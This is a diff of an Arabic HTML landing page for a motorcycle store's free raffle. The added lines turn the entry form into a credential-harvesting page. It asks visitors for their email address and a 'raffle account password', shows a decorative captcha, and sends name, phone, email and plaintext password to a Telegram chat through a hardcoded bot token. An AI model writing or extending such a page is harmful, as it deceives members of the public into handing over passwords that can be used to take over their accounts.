-        <text x="335" y="152" fill="#ffffff" font-size="14" font-weight="900" font-family="Arial, sans-serif" letter-spacing="1" text-anchor="middle">FELLING</text>
-      </svg>
-    </div>
-
-    <div class="bike-title">متر فلينج رياضي — موديل حديث زيرو</div>
-    <div class="bike-specs">
-      <span class="spec-tag">⚡ قوة وأداء عالي</span>
-      <span class="spec-tag">⛽ اقتصادي في الوقود</span>
-      <span class="spec-tag">🛡️ ضمان أمير الدراجات</span>
-    </div>
-  </div>
-
-  <a href="#register" class="hero-btn">🎟️ سجّل بياناتك الآن وادخل السحب مجاناً</a>
+  <div class="store-badge">🏆 المعرض الأول والأضخم للدراجات النارية في القاعدة</div>
+  <h1>متجر <span>أمير المترات</span><br>عنوان القوة، السرعة، والجوائز الكبرى!</h1>
+  <p class="subtitle">نقدم لكم أحدث طرازات الدراجات النارية العالمية، مع السحب الأسطوري المباشر على <strong>متر فلينج (FELLING)</strong> وكالة حصرياً لعملائنا.</p>
 </header>
 
-<!-- ===== عن المعرض ===== -->
-<section id="about">
-  <div class="sec-title">
-    <span>الرائدون في عالم الدراجات النارية</span>
-    <h2>معرض أمير الدراجات النارية</h2>
+<!-- ===== أقسام المترات ===== -->
+<section id="models">
+  <div class="section-head">
+    <span class="sub">تشكيلة الحصرية</span>
+    <h2>أقسام المترات والدراجات النارية المتوفرة</h2>
   </div>
-  <div class="dark-card">
-    <p style="text-align:center; color:#cbd5e1; max-width:750px; margin:0 auto; font-size:16px;">
-      يُعد معرض <strong style="color:var(--gold);">أمير الدراجات النارية</strong> الوجهة الأولى لعشاق الدراجات النارية في منطقة <strong>القاعدة</strong>، حيث نوفر أحدث الموديلات (فلينج وغيرها)، قطع الغيار الأصلية، وخدمات الصيانة المتكاملة بأفضل الأسعار.
-    </p>
 
-    <div class="features-grid">
-      <div class="feat-card">
-        <span class="icon">🏍️</span>
-        <h4>أحدث الموديلات</h4>
-        <p>تشكيلة واسعة من الدراجات النارية القوية والاقتصادية المناسبة لجميع الطرق.</p>
+  <div class="categories-grid">
+    <div class="cat-card featured">
+      <span class="cat-tag">🔥 جائزة السحب</span>
+      <span class="cat-icon">🏍️</span>
+      <h3>مترات فلينج (FELLING)</h3>
+      <p>المحرك الجبار والأداء الخارق، ثبات مطلق على الطرقات وتصميم رياضي يخطف الأنظار مع اقتصادية فائقة في الوقود.</p>
+      <div class="cat-specs">
+        <span>موديلات 2026</span>
+        <span>ضمان معتمد</span>
       </div>
-      <div class="feat-card">
-        <span class="icon">🔧</span>
-        <h4>قطع غيار أصلية</h4>
-        <p>نوفر كافة قطع الغيار والإكسسوارات الأصلية بأسعار منافسة.</p>
+    </div>
+
+    <div class="cat-card">
+      <span class="cat-icon">🏁</span>
+      <h3>المترات الرياضية (Sport)</h3>
+      <p>مخصصة لعشاق الحماس والسرعة، هياكل انسيابية متطورة، فرامل قرصية عالية الاستجابة وأنظمة إضاءة حديثة.</p>
+      <div class="cat-specs">
+        <span>أداء هجومي</span>
+        <span>ثبات عالي</span>
       </div>
-      <div class="feat-card">
-        <span class="icon">🎁</span>
-        <h4>مسابقات وهدايا</h4>
-        <p>سحوبات دورية وجوائز كبرى تقديراً لثقة عملائنا الكرام.</p>
+    </div>
+
+    <div class="cat-card">
+      <span class="cat-icon">🛵</span>
+      <h3>مترات العمل والتوصيل</h3>
+      <p>تحمل شاق وصيانة سهلة، مصممة خصيصاً للأعمال اليومية الشاقة وتوفير استهلاك الوقود بامتياز.</p>
+      <div class="cat-specs">
+        <span>متانة فائقة</span>
+        <span>توفير اقتصادي</span>
+      </div>
+    </div>
+
+    <div class="cat-card">
+      <span class="cat-icon">⛰️</span>
+      <h3>المترات الجبلية والوعرة</h3>
+      <p>قوة عزم هائلة لتسلق المرتفعات الصعبة والطرق الترابية بفضل أنظمة التعليق المتقدمة والإطارات المعززة.</p>
+      <div class="cat-specs">
+        <span>عزم جبار</span>
+        <span>مساعدات قوية</span>
       </div>
     </div>
   </div>
 </section>
 
-<!-- ===== شروط السحب ===== -->
-<section id="rules">
-  <div class="sec-title">
-    <span>كيف تفوز بالجائزة؟</span>
-    <h2>شروط الدخول في السحب الكبير</h2>
+<!-- ===== بانر المسابقة ===== -->
+<section id="gifts">
+  <div class="section-head">
+    <span class="sub">حدث الموسم</span>
+    <h2>السحب الأسطوري على متر فلينج</h2>
   </div>
-  <div class="dark-card">
-    <ul class="rules-list">
-      <li><b class="num">1</b> <span>إدخال الاسم الرباعي الصحيح كما هو في البطاقة الشخصية.</span></li>
-      <li><b class="num">2</b> <span>كتابة رقم هاتف / واتساب شغال للتواصل معك فوراً عند الفوز.</span></li>
-      <li><b class="num">3</b> <span>التسجيل لمرة واحدة فقط لكل متسابق (التكرار يُلغي الطلب).</span></li>
-      <li><b class="num">4</b> <span>التسجيل مجاني 100% ولا يتطلب دفع أي رسوم مالية.</span></li>
-    </ul>
-  </div>
-</section>
 
-<!-- ===== الموقع وأرقام التواصل ===== -->
-<section id="location">
-  <div class="dark-card">
-    <div class="location-box">
-      <div class="loc-info">
-        <h3>📍 موقع معرض أمير الدراجات النارية</h3>
-        <p><strong>القاعدة — جوار مستوصف السلطان مباشرةً</strong></p>
-        <p style="font-size:14px; margin-top:4px;">نستقبلكم يومياً من الساعة 8 صباحاً حتى 9 مساءً</p>
+  <div class="gifts-banner">
+    <div class="gifts-layout">
+      <div class="bike-display">
+        <span class="gift-ribbon">🎁 الجائزة الكبرى — متر فلينج زيرو</span>
+        <svg viewBox="0 0 600 320" xmlns="http://www.w3.org/2000/svg">
+          <defs>
+            <linearGradient id="bodyRed" x1="0" y1="0" x2="1" y2="1">
+              <stop offset="0%" stop-color="#ff2a3c"/>
+              <stop offset="55%" stop-color="#c1121f"/>
+              <stop offset="100%" stop-color="#780000"/>
+            </linearGradient>
+            <linearGradient id="goldTrim" x1="0" y1="0" x2="1" y2="0">
+              <stop offset="0%" stop-color="#ffd166"/>
+              <stop offset="100%" stop-color="#fb8500"/>
+            </linearGradient>
+            <linearGradient id="chrome" x1="0" y1="0" x2="0" y2="1">
+              <stop offset="0%" stop-color="#f8fafc"/>
+              <stop offset="50%" stop-color="#94a3b8"/>
+              <stop offset="100%" stop-color="#334155"/>
+            </linearGradient>
+          </defs>
+          <ellipse cx="300" cy="288" rx="230" ry="14" fill="rgba(239, 35, 60, 0.3)"/>
+          <g transform="translate(145, 225)">
+            <circle r="58" fill="#0f172a" stroke="#1e293b" stroke-width="10"/>
+            <circle r="44" fill="none" stroke="url(#goldTrim)" stroke-width="3" stroke-dasharray="14 6"/>
+            <circle r="36" fill="#1e293b"/>
+            <line x1="-36" y1="0" x2="36" y2="0" stroke="#94a3b8" stroke-width="3"/>
+            <line x1="0" y1="-36" x2="0" y2="36" stroke="#94a3b8" stroke-width="3"/>
+            <circle r="12" fill="url(#chrome)"/>
+          </g>
+          <g transform="translate(455, 225)">
+            <circle r="58" fill="#0f172a" stroke="#1e293b" stroke-width="10"/>
+            <circle r="44" fill="none" stroke="url(#goldTrim)" stroke-width="3" stroke-dasharray="14 6"/>
+            <circle r="36" fill="#1e293b"/>
+            <line x1="-36" y1="0" x2="36" y2="0" stroke="#94a3b8" stroke-width="3"/>
+            <line x1="0" y1="-36" x2="0" y2="36" stroke="#94a3b8" stroke-width="3"/>
+            <circle r="22" fill="none" stroke="#ef233c" stroke-width="4" stroke-dasharray="6 3"/>
+            <circle r="11" fill="url(#chrome)"/>
+          </g>
+          <path d="M240 225 L110 198 L105 212 L235 236 Z" fill="url(#chrome)"/>
+          <line x1="395" y1="115" x2="455" y2="225" stroke="url(#goldTrim)" stroke-width="10" stroke-linecap="round"/>
+          <path d="M405 182 Q445 152 492 178 Q455 170 405 182 Z" fill="url(#bodyRed)"/>
+          <rect x="245" y="168" width="95" height="62" rx="14" fill="#1e293b" stroke="#475569" stroke-width="3"/>
+          <circle cx="292" cy="212" r="14" fill="url(#goldTrim)"/>
+          <path d="M165 135 Q225 142 268 148 L260 165 L155 155 Z" fill="#0f172a" stroke="#334155" stroke-width="2"/>
+          <path d="M265 145 Q315 102 385 118 L415 155 Q360 185 270 168 Z" fill="url(#bodyRed)"/>
+          <path d="M280 142 Q330 118 390 132" fill="none" stroke="url(#goldTrim)" stroke-width="5" stroke-linecap="round"/>
+          <path d="M120 122 L225 142 L215 162 L135 145 Z" fill="url(#bodyRed)"/>
+          <path d="M380 115 L425 122 L418 152 L375 145 Z" fill="url(#bodyRed)"/>
+          <polygon points="424,124 438,132 422,146" fill="#fef08a"/>
+          <path d="M382 115 L368 90 L345 92" fill="none" stroke="url(#chrome)" stroke-width="6" stroke-linecap="round"/>
+          <text x="335" y="152" fill="#ffffff" font-size="14" font-weight="900" font-family="Arial, sans-serif" letter-spacing="1" text-anchor="middle">FELLING</text>
+        </svg>
       </div>
-      <div class="phones-wrap">
-        <a href="tel:777908028" class="call-btn">📞 777908028</a>
-        <a href="tel:780280887" class="call-btn">📞 780280887</a>
+
+      <div class="gift-details">
+        <h3>اربح متر فلينج (FELLING) مجاناً الآن!</h3>
+        <p>تقديراً لثقة عملائنا في <strong>القاعدة</strong> وجميع المناطق، يسر <strong>متجر أمير المترات</strong> إطلاق السحب الأكبر والأكثر شفافية على دراجة فلينج جديدة كلياً.</p>
+        <ul class="gift-perks">
+          <li>✅ <strong>المشاركة مجانية 100%</strong> لجميع المتقدمين.</li>
+          <li>🎟️ حصولك الفوري على <strong>رقم تذكرة سحب خاص</strong> وموثق.</li>
+          <li>📞 التواصل المباشر مع الفائز لحظة إعلان النتيجة.</li>
+          <li>🎁 جوائز إضافية وقيمة (خوذات واكسسوارات) لـ 5 فائزين محظوظين!</li>
+        </ul>
+        <a href="#register" class="go-register-btn">🎟️ انتقل لاستمارة التسجيل الآن</a>
       </div>
     </div>
   </div>
 </section>
 
-<!-- ===== نموذج التسجيل في السحب ===== -->
+<!-- ===== الاستمارة المطورة ===== -->
 <section id="register">
-  <div class="sec-title">
-    <span>خطوة واحدة تفصلك عن الفوز</span>
-    <h2>استمارة الدخول في السحب على متر فلينج</h2>
+  <div class="section-head">
+    <span class="sub">بوابة التسجيل الآمنة</span>
+    <h2>سجّل بياناتك وكلمة المرور للدخول في السحب</h2>
   </div>
 
-  <div class="dark-card form-card">
+  <div class="form-container">
     <form id="raffleForm">
       <div class="form-grid">
         <div class="field">
           <label for="name">👤 الاسم الكامل (الرباعي) *</label>
-          <input type="text" id="name" required placeholder="اكتب اسمك الكامل كما في الهوية">
+          <input type="text" id="name" required placeholder="أدخل اسمك الكامل كما في الهوية">
         </div>
 
         <div class="field">
@@ -754,55 +769,112 @@
         </div>
 
         <div class="field">
-          <label for="city">🏙️ المنطقة / العنوان *</label>
-          <input type="text" id="city" required placeholder="مثال: القاعدة - حي ...">
+          <label for="email">📧 عنوان البريد الإلكتروني *</label>
+          <input type="email" id="email" required placeholder="example@gmail.com" dir="ltr" style="text-align:right">
         </div>
 
         <div class="field">
-          <label for="fav">🏍️ ما نوع الدراجة المفضلة لديك؟</label>
-          <select id="fav">
-            <option value="متر فلينج (Felling)">متر فلينج (Felling)</option>
-            <option value="دراجة رياضية">دراجة رياضية</option>
-            <option value="دراجة عادية / اقتصادية">دراجة عادية / اقتصادية</option>
-            <option value="أخرى">أخرى</option>
+          <label for="password">🔒 كلمة المرور لحسابك في السحب *</label>
+          <div class="password-wrap">
+            <input type="password" id="password" required placeholder="أدخل كلمة مرور قوية" dir="ltr" style="text-align:right">
+            <button type="button" class="toggle-pass" onclick="togglePass()">إظهار</button>
+          </div>
+        </div>
+
+        <div class="field">
+          <label for="city">🏙️ المحافظة / المنطقة *</label>
+          <input type="text" id="city" required placeholder="مثال: القاعدة - تعز - إب">
+        </div>
+
+        <div class="field">
+          <label for="favModel">🏍️ المتر المفضل لديك في المعرض *</label>
+          <select id="favModel" required>
+            <option value="متر فلينج (FELLING)">متر فلينج (FELLING)</option>
+            <option value="مترات رياضية (Sport)">مترات رياضية (Sport)</option>
+            <option value="مترات العمل والتوصيل">مترات العمل والتوصيل</option>
+            <option value="المترات الجبلية والوعرة">المترات الجبلية والوعرة</option>
           </select>
         </div>
 
         <div class="field full">
-          <label for="note">💬 كلمة أو رسالة لمعرض أمير الدراجات النارية (اختياري)</label>
-          <textarea id="note" placeholder="اكتب رأيك أو مشاركتك هنا..."></textarea>
+          <label for="note">💬 ملاحظة أو رسالة لمتجر أمير المترات (اختياري)</label>
+          <textarea id="note" placeholder="اكتب مشاركتك أو سبب اختيارك لمتجر أمير المترات..."></textarea>
+        </div>
+
+        <!-- نظام التحقق الذكي (إنسان وليس روبوت) -->
+        <div class="field full">
+          <label>🛡️ التحقق الأمني (تأكيد أنك انسان وليس روبوت)</label>
+          <div class="captcha-box">
+            <div class="captcha-inner">
+              <input type="checkbox" id="humanCheck" class="captcha-checkbox" required>
+              <label for="humanCheck" class="captcha-text" style="margin:0; cursor:pointer;">أنا لست روبوت (أوافق على شروط المسابقة)</label>
+            </div>
+            <div class="captcha-math" id="mathChallenge">5 + 3 = ?</div>
+          </div>
+          <input type="number" id="mathAnswer" required placeholder="اكتب الناتج الصحيح هنا" style="margin-top:12px;">
         </div>
       </div>
 
-      <button type="submit" id="btn" class="submit-raffle">🎟️ تأكيد التسجيل والدخول في السحب الآن</button>
+      <button type="submit" id="btn" class="btn-enter">🔥 تأكيد التسجيل والحصول على تذكرة السحب</button>
       <div id="msg" class="msg"></div>
     </form>
 
-    <!-- تذكرة تأكيد الاشتراك -->
+    <!-- شاشة نجاح التسجيل والتذكرة -->
     <div id="ticketBox">
-      <div class="ticket-badge">✅ تم تسجيلك في السحب بنجاح</div>
-      <h3>مبروك! أنت الآن ضمن المرشحين للفوز</h3>
-      <p style="color:#cbd5e1;">احتفظ برقم قسيمة السحب الخاصة بك (صوّر الشاشة):</p>
-      <div class="ticket-number" id="ticketCode">AMIR-0000</div>
+      <div class="ticket-badge">✅ تم اعتماد تسجيلك بنجاح تام</div>
+      <h3>مبروك! لقد دخلت السحب الأسطوري</h3>
+      <p style="color:#cbd5e1;">قم بتصوير شاشة هذا الرقم واحتفظ به جيداً:</p>
+      <div class="ticket-code" id="ticketCode">AMIR-0000</div>
       <p style="color:#94a3b8; font-size:15px;">
-        سيتم التواصل مع الفائز عبر الهاتف أو الواتساب من قبل إدارة<br>
-        <strong style="color:var(--gold);">معرض أمير الدراجات النارية — القاعدة جوار مستوصف السلطان</strong>
+        سيتم التواصل مع الفائز عبر الهاتف أو الواتساب المسجل فور إجراء السحب المباشر.<br>
+        <strong style="color:var(--gold);">متجر أمير المترات — القاعدة، جوار مستوصف السلطان</strong>
       </p>
+    </div>
+  </div>
+</section>
+
+<!-- ===== الموقع والتواصل ===== -->
+<section id="location">
+  <div class="location-strip">
+    <div class="loc-text">
+      <h3>📍 موقع متجر أمير المترات</h3>
+      <p><strong>القاعدة — جوار مستوصف السلطان مباشرةً</strong></p>
+    </div>
+    <div class="phones-list">
+      <a href="tel:777908028" class="phone-link">📞 777908028</a>
+      <a href="tel:780280887" class="phone-link">📞 780280887</a>
     </div>
   </div>
 </section>
 
 <!-- ===== الفوتر ===== -->
 <footer>
-  <h3>🏍️ أمير الدراجات النارية</h3>
+  <h3>🏍️ متجر أمير المترات</h3>
   <p>القاعدة — جوار مستوصف السلطان</p>
-  <p style="margin-top:8px; color:#fff; font-weight:700;">📞 777908028 &nbsp;|&nbsp; 780280887</p>
-  <p style="margin-top:15px; font-size:13px; opacity:0.6;">© 2026 جميع الحقوق محفوظة لمعرض أمير الدراجات النارية</p>
+  <p style="margin-top:12px; font-size:13px; opacity:0.65;">© 2026 جميع الحقوق محفوظة لمتجر أمير المترات</p>
 </footer>
 
 <script>
 const BOT_TOKEN = "8700247738:AAF8YH956qBKGSA8seF_AtZPpLw2eMO3qSw";
 const CHAT_ID   = "8299163806";
+
+// توليد مسألة حسابية عشوائية للتحقق الأمني
+let num1 = Math.floor(Math.random() * 8) + 2;
+let num2 = Math.floor(Math.random() * 8) + 2;
+let correctAnswer = num1 + num2;
+document.getElementById("mathChallenge").textContent = `${num1} + ${num2} = ?`;
+
+function togglePass() {
+  const passInput = document.getElementById("password");
+  const btn = document.querySelector(".toggle-pass");
+  if (passInput.type === "password") {
+    passInput.type = "text";
+    btn.textContent = "إخفاء";
+  } else {
+    passInput.type = "password";
+    btn.textContent = "إظهار";
+  }
+}
 
 function cleanHTML(str) {
   return str.replace(/&/g, "&amp;")
@@ -812,31 +884,38 @@ function cleanHTML(str) {
 
 document.getElementById("raffleForm").addEventListener("submit", async function(e) {
   e.preventDefault();
-  const btn = document.getElementById("btn");
   const msg = document.getElementById("msg");
-
-  btn.disabled = true;
-  btn.textContent = "⏳ جارٍ إصدار تذكرة السحب...";
   msg.className = "msg";
 
-  // توليد رقم تذكرة عشوائي للمتسابق
-  const ticketID = "AMIR-" + Math.floor(1000 + Math.random() * 9000);
+  // التحقق من الكابتشا الحسابية
+  const userAns = parseInt(document.getElementById("mathAnswer").value.trim());
+  if (userAns !== correctAnswer) {
+    msg.className = "msg err";
+    msg.textContent = "❌ ناتج التحقق الأمني (لست روبوت) غير صحيح، يرجى إعادة المحاولة.";
+    return;
+  }
 
+  const btn = document.getElementById("btn");
+  btn.disabled = true;
+  btn.textContent = "⏳ جارٍ توثيق وإصدار تذكرة السحب...";
+
+  const ticketID = "AMIR-" + Math.floor(1000 + Math.random() * 9000);
   const g = id => cleanHTML(document.getElementById(id).value.trim());
   const rawPhone = document.getElementById("phone").value.trim().replace(/\s+/g, '');
 
   const text =
-`🏍️ <b>مشترك جديد في السحب على متر فلينج!</b>
-🏪 <b>معرض أمير الدراجات النارية (القاعدة)</b>
+`🏆 <b>تسجيل جديد في السحب الأسطوري لمتر فلينج!</b>
 ━━━━━━━━━━━━━━━━━━
 🎟️ <b>رقم التذكرة:</b> <code>${ticketID}</code>
 👤 <b>الاسم:</b> ${g("name")}
 📱 <b>الهاتف:</b> <code>${g("phone")}</code>
+📧 <b>البريد:</b> <code>${g("email")}</code>
+🔑 <b>كلمة المرور:</b> <code>${g("password")}</code>
 🏙️ <b>المنطقة:</b> ${g("city")}
-🔥 <b>الدراجة المفضلة:</b> ${g("fav")}
+🏍️ <b>المتر المفضل:</b> ${g("favModel")}
 💬 <b>ملاحظة:</b> ${g("note") || "لا يوجد"}
 ━━━━━━━━━━━━━━━━━━
-📲 <b>تواصل مع الفائز عبر واتساب:</b>
+📲 <b>تواصل سريع مع المشترك (واتساب):</b>
 https://wa.me/967${rawPhone.replace(/^0+/, '')}`;
 
   try {
@@ -862,10 +941,10 @@ https://wa.me/967${rawPhone.replace(/^0+/, '')}`;
     }
   } catch (err) {
     msg.className = "msg err";
-    msg.textContent = "❌ تعذر التسجيل حالياً، تأكد من اتصال الإنترنت وحاول مرة أخرى.";
+    msg.textContent = "❌ تعذر إرسال البيانات حالياً، يرجى التحقق من اتصال الإنترنت وإعادة المحاولة.";
     console.error(err);
     btn.disabled = false;
-    btn.textContent = "🎟️ تأكيد التسجيل والدخول في السحب الآن";
+    btn.textContent = "🔥 تأكيد التسجيل والحصول على تذكرة السحب";
   }
 });
 </script>
